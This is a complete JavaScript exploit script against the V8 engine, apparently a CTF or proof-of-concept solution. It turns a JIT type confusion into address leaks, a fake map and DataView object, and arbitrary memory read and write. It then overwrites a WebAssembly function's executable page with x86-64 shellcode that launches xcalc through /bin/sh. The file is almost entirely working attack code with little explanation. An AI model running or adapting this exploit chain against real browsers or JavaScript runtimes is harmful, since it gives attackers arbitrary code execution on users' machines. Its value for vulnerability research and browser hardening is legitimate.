wasm_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);
wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(wasm_bytes), {imports: {imported_func: function(x){ return x; }}});
wasm_func = wasm_inst.exports.exported_func;

function d_to_i2(c){
    var x=new Uint32Array(new Float64Array([c]).buffer);
    return[x[1],x[0]];
}

function i2_to_d(a){
    return new Float64Array(new Uint32Array([a[1],a[0]]).buffer)[0];
}

function i2_to_hex(a){
    var c=("00000000"+a[0].toString(16)).substr(-8);
    var b=("00000000"+a[1].toString(16)).substr(-8);
    return[c,b];}

function p_i2(a){
    console.log(i2_to_hex(d_to_i2(a))[0]+i2_to_hex(d_to_i2(a))[1]);
    }

function hex(a){
    return"0x"+("00000000"+a[0].toString(16)).slice(-8)+("00000000"+a[1].toString(16)).slice(-8)};


function gc() {
    for (let i = 0; i < 0x10; i++)
        new ArrayBuffer(0x1000000);}

function leak(o) {
  return o.a.x; 
}

var fake_map_obj = [
    /* Fake Map object */
    i2_to_d([0,0]),
    i2_to_d([0x1900043f,0x18090909]),
    i2_to_d([0,0x84003ff]),
    i2_to_d([0,0]),
    /* Fake ArrayBuffer object (fake_map_obj+0x20)*/ 
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([0x44444444,0x43434343]),// backing store, pointed to heap 
    i2_to_d([0,0]),
].slice(0);

//push the fake_map_obj to old space and become fixed
gc();
gc();
gc();


var o = {a:{x:1.1}}
// JIT it 
for (let i = 0; i < 100000; i++){
    leak(o);
} 

o.a = {z:fake_map_obj};
offset = 0x60-0x10
fake_map_obj_addr  = leak(o);
console.log("[+] Leaked fake map :");
p_i2(fake_map_obj_addr);
fake_map_obj_addr = d_to_i2(fake_map_obj_addr);
console.log(fake_map_obj_addr);
//%DebugPrint(fake_map_obj);

var fake_map_lo =  fake_map_obj_addr[1] -offset-1;
var fake_map_hi =  fake_map_obj_addr[0] ;

console.log("Fake map location :");
p_i2(i2_to_d([fake_map_hi,fake_map_lo]));

var fake_dv_obj = [
    i2_to_d([fake_map_hi,fake_map_lo + 1]),
    i2_to_d([0,0]),
    i2_to_d([0,0]),
    i2_to_d([fake_map_hi,fake_map_lo + 0x20 + 1]), //arraybuffer 
    i2_to_d([0,0]),
    i2_to_d([0x4000,0]),
    ].slice(0);


//this gc is to prevent this crash
//Fatal error in ../../src/heap/mark-compact.cc, line 1119
//Debug check failed: p->InToSpace() implies p->IsFlagSet(Page::PAGE_NEW_NEW_PROMOTION).
//Also we need the fake map object ,so we must push it to old space
gc();
gc();
gc();
gc();
gc();

// no naming duplication
// eg if you create sth like gg = {a:{c:{pk:ab}}} here, it will reuse the old map
// Then you cannot trigger the bug again for creating object from double
// this works gg = {g:{c:{pk:ab}}}


o.a = {z:fake_dv_obj};
fake_dv_obj_addr = leak(o);
console.log("[+] Leaked fake_dv_obj :");
p_i2(fake_dv_obj_addr);
//%DebugPrint(fake_dv_obj);

fake_dv_buffer = d_to_i2(fake_dv_obj_addr);
var fake_dv_buffer_lo =  fake_dv_buffer[1] -0x30;
var fake_dv_buffer_hi =  fake_dv_buffer[0] ;

fake_dv_buffer_addr = i2_to_d([fake_dv_buffer_hi,fake_dv_buffer_lo]);
console.log("Faked DataView Address");
p_i2(fake_dv_buffer_addr)


o.a = {z:wasm_func};
wasm_object_addr = leak(o);
console.log("[+] Leaked wasm_object_addr :");
p_i2(wasm_object_addr);
var wasm_object_addr = d_to_i2(wasm_object_addr)
var wasm_object_addr_lo =  wasm_object_addr[1] -1;
var wasm_object_addr_hi =  wasm_object_addr[0] ;

function fake(gg) {
    return gg.g.c.pk;
}

// Since we are using DataView faking
// we can fake it to anything not number to trigger this type confusion
var gg = {g:{c:{pk:Object}}}

// JIT it 
for (let i = 0; i < 100000; i++){
    fake(gg);
} 

gg = {g:{c:{t:fake_dv_buffer_addr}}}

dv = fake(gg);
//%DebugPrint(dv);
//%DebugPrint(fake_map_obj);
console.log("addr contains rwx :")
p_i2(i2_to_d([wasm_object_addr_hi,wasm_object_addr_lo-0x130+8]))
function read_ptr(addr){
    fake_map_obj[8] =i2_to_d(addr);
    var lo = DataView.prototype.getUint32.call(dv, 0, true);
    var hi = DataView.prototype.getUint32.call(dv, 4, true);
    return (i2_to_d([hi,lo]));
}

wasm_rwx = read_ptr([wasm_object_addr_hi,wasm_object_addr_lo-0x130+8])
console.log("Leaked rwx :")
p_i2(wasm_rwx)


var shellcode = [0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x2e,0x30,0x20,0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x2f,0x78,0x63,0x61,0x6c,0x63,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05]

fake_map_obj[8] = wasm_rwx
for (var k = 0; k < shellcode.length; ++k) {
    DataView.prototype.setUint32.call(dv, k * 1, shellcode[k], true);
}

wasm_func()
